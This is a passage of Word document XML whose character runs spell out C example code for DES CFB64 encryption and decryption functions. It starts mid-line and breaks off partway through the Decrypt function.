        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:t>es.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>char *</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>ncry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>( char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:t>Ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">char *Msg, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="580" w:right="6301"/>
      </w:pPr>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>char*    R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">nt            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>n=0; D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_cb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ock      Key2;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="580" w:right="5539"/>
      </w:pPr>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>sched</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ched</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e; R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>s =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>( char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">* ) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oc( s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="10"/>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>* Prepare</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he key for use w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_cfb64_e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>crypt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>*/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580" w:right="4049"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>cpy(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Key2, Ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>,8); D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>_odd_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>y(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>Key2 ); D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:t>ey_chec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ed( </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Key2, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>sched</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e );</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">* </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>ncry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on occurs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>here */</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_cfb64_encryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>( u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>char * ) Msg, ( u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>char * ) R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>s,s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>schedu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e,</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Key2, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>n, D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>NC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:t>YPT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>urn (R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>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4"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>char *Decryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>char *Ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>, char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">sg, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="580" w:right="6301"/>
      </w:pPr>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>char*    R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">nt            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>n=0; D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_cb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ock      Key2;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="640" w:right="5479" w:hanging="60"/>
      </w:pPr>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>sched</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ched</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e; R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>s =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>( char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">* ) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oc( s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>* Prepare</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he key for use w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_cfb64_e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>crypt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>*/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580" w:right="4049"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>cpy(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Key2, Ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>,8); D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
